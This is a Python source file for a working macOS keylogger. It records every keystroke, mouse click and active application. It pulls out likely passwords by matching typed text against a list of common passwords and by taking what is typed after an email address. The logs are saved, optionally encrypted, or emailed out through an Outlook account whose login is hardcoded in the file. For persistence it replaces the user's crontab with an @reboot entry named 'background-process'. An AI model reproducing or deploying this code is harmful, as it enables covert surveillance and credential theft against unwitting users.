#!/usr/bin/env python3

from webbrowser import get
from AppKit import NSWorkspace
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
import os
from pynput import keyboard, mouse
import re
import smtplib
import sys
import threading
import uuid

"""
    MISCELLANEOUS
"""

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d-%m-%Y %H%M-%S')

def sort_dict_descending_keys(dictionary):
    return sorted(dictionary.items(), key=lambda pair: len(pair[1]), reverse=True)

def setup_crontab(exe_name):
    """
        This function ensures that the keylogger executable is run on startup
        Expects an exectuable file in the home directory
    """
    # delete the crontab file and disregard any errors (ie. if there was no crontab file to begin with)
    os.system("crontab -r > /dev/null 2>&1")
    # make a new crontab by filling it with an empty line
    os.system("echo '' | crontab -")
    # update the crontab
    os.system(f"( crontab -l; printf '@reboot \"~{exe_name}\"\n' ) | crontab -")

def is_email(email):
    regex = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")
    return re.search(regex, email)

"""
    EMAIL SENDING
"""

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(json_string):
    address = 'keylogger-sap@outlook.com'
    pssword = 'MyK3yLogger124'
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(address, pssword)

    mime_object = construct_mime(address, json_string)
    server.send_message(mime_object)

    server.quit()

"""
    EMAIL PASSWORD GUESSING
"""

def find_next_password(slice):
    """
        Given the slice of an array just after where an email was found, find the first dictionary with an "o" key
        This is likely to be a password so return its value
        Return None if no password was found
    """
    for s in slice:
        if not 'o' in s:
            continue
        return s['o']
    return None
        
"""
    APPLICATION TRACKING
"""

def get_focus_app_string():
    workspace = NSWorkspace.sharedWorkspace()
    return workspace.activeApplication()['NSApplicationName']

"""
    FILEWRITING
"""
def write_normal_file(json_string, filename):
    with open(filename, 'w') as f:
        f.write(json_string)

def write_encrypted_file(json_string, passphrase, filename):
    temp_json_file = str(uuid.uuid4())
    with open(temp_json_file, 'w') as f:
        f.write(json_string)
    
    os.system(f"openssl enc -aes-128-cbc -in {temp_json_file} -base64 -out '{filename}' -k {passphrase} -md sha256")
    os.remove(temp_json_file)

"""
    MONITORING
"""

class Monitor:
    def __init__(self):
        # settings as they appear in generate.exe
        self.log_interval = 60
        self.encrypt_logfiles = False
        self.exe_name = 'background-process'
        self.passphrase = 'fishing-in-the-river-champion'
        self.log_via_email = False

        # suffixes

        self.log_folder = 'logs'
        # the guesses will have the same name as normal log files, but they will have this suffix at the end of their name
        self.guess_suffix = 'special'
        # the interpreted log file will have this suffix
        self.interpreted = 'interpreted'
        # applications
        self.apps_suffx = 'apps'

        # state variables
        self.logs = list()
        self.text = str()
        self.current_app = get_focus_app_string()
        self.apps = { self.current_app : [ timestamp() ] }
    
        # for password guessing
        self.password_set = {"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"}
        
        # logs of all inputs filtered out using special rules outlined in 4.2
        self.guess_logs = list()
        # the text of the current password guess
        self.guess_text = str()
        # the actual guesses made
        self.guesses = list()
        
        # listeners
        self.keys = keyboard.Listener(on_press=self.on_press)
        self.mice = mouse.Listener(on_click=self.on_click)

    # application monitoring
    def update_app_on_input(self):
        current = get_focus_app_string()
        if current != self.current_app:
            right_now = timestamp()
            if not current in self.apps:
                self.apps[current] = [right_now]
            else:
                self.apps[current].append(right_now)

            self.current_app = current

    def application_log(self):
        # there will always be at least 1 app open so always log this
        # log in order of most apps used
        
        # most_used = sort_dict_descending_keys(self.apps)
        json_string = json.dumps(self.apps, indent=4)
        right_now = timestamp()
        filename = f'{self.log_folder}/{right_now} {self.apps_suffx}.json'
        if self.encrypt_logfiles:
            write_encrypted_file(json_string, self.passphrase, filename)
        else:
            write_normal_file(json_string, filename)
        
        self.apps = { get_focus_app_string() : [ right_now ]}

    # relating to guessing

    def update_guess_text(self): 
        # dont' do anything if there is no guess text
        if not self.guess_text:
            return
        
        self.guess_logs.append({'o' : self.guess_text})
        self.guess_text = str()

    # handling guess special characters
    def handle_special_key_guess(self, key):
        # determine whether it is time to break out of the current guess
        break_keys = {keyboard.Key.tab, keyboard.Key.enter}
        if key in break_keys:
            self.update_guess_text()
            self.guess_logs.append({'s' : key.name.upper()})
        
        # ignore other special keys
    
    def lookup_guess(self):
        """
            perform a guess based on a dictionnary / lookup table attack
        """
        for item in self.guess_logs:
            # only consider ordinary text
            if not 'o' in item:
                continue
            
            guess = item['o']
            lowercase_guess = guess.lower()
            if lowercase_guess in self.password_set:
                self.guesses.append(guess)
                self.password_set.discard(lowercase_guess)

    def email_guess(self):
        for idx, item in enumerate(self.guess_logs):
            if not 'o' in item:
                continue
            
            text = item['o']
            if is_email(text):
                password = find_next_password(self.guess_logs[idx + 1:])
                if password:
                    self.guesses.append(password)
    
    def perform_guess_strategies(self):
        # update the last piece of text entered
        self.update_guess_text()

        if not self.guess_logs:
            return
        
        self.lookup_guess()
        self.email_guess()

        # write the guesses and also the raw files
        right_now = timestamp()
        for contents, suffix in zip([self.guesses, self.guess_logs], [self.guess_suffix, self.interpreted]):
            # don't log anything if there are no contents
            if not contents:
                continue

            json_string = json.dumps(contents, indent=4)
            filename = f'{self.log_folder}/{right_now} {suffix}.json'
            if self.encrypt_logfiles:
                write_encrypted_file(json_string, self.passphrase, filename)
            else:
                write_normal_file(json_string, filename)

            contents = list()
    
    # relating to normal logging
    
    def log_to_file(self, json_string):
        filename = f'{self.log_folder}/{timestamp()}.json'
        if self.encrypt_logfiles:
            write_encrypted_file(json_string, self.passphrase, filename)
        else:
            write_normal_file(json_string, filename)
    
    def update_text(self):
        # don't update text if it is empty
        if not self.text:
            return

        self.logs.append({'o' : self.text})
        self.text = str()
    
    def create_log(self):
        # add the last piece of text if any
        self.update_text()
        # do not make a log if nothing has been recorded
        if not self.logs:
            return

        json_string = json.dumps(self.logs, indent=4)
        if self.log_via_email:
            send_email(json_string)
        else:
            self.log_to_file(json_string)

        self.logs = list()
     
    def log_loop(self):
        timer = threading.Timer(interval=self.log_interval, function=self.log_loop)
        timer.daemon = True
        timer.start()

        self.update_logs()
    
    def record_raw_input(self, input_dict):
        self.update_text()
        self.logs.append(input_dict)

    def on_press(self, key):
        # handle the None case and all falsey keyboard.Keys
        if not key:
            return

        self.update_app_on_input()

        if (key == keyboard.Key.esc):
            self.update_logs()
            self.mice.stop()
            return False
        
        try:
            self.text += key.char
            # record any normal key for the guessing
            self.guess_text += key.char
        # when we hit a special character we update all regular text
        except AttributeError:
            self.handle_special_key_guess(key)
            self.record_raw_input({'s' : key.name.upper()})

    # pass in x and y to follow expected parameters of on_click
    def on_click(self, x, y, button, pressed):
        if (pressed):
            self.update_app_on_input()

            record = {'m' : button.name.upper()}
            self.record_raw_input(record)

            # the text for the guess would have been entered first so update it first before recording the mouse click
            self.update_guess_text()
            self.guess_logs.append(record)

    def run(self):
        # run crontab on MacOS to ensure exe starts on system boot
        if sys.platform.startswith('darwin'):
            setup_crontab(self.exe_name)

        # create the logs folder if it does not exist if running in file logging mode
        if not self.log_via_email:
            try:
                os.mkdir(self.log_folder)
            except FileExistsError:
                pass

        self.keys.start()
        self.mice.start()

        self.log_loop()

        self.keys.join()
        self.mice.join()
    
    def update_logs(self):
        """
            Perform tasks that should be done when a new log is written
        """
        self.create_log()
        self.perform_guess_strategies()
        self.application_log()
        
def main():
    monitor = Monitor()
    monitor.run()

if __name__ == '__main__':
    main()
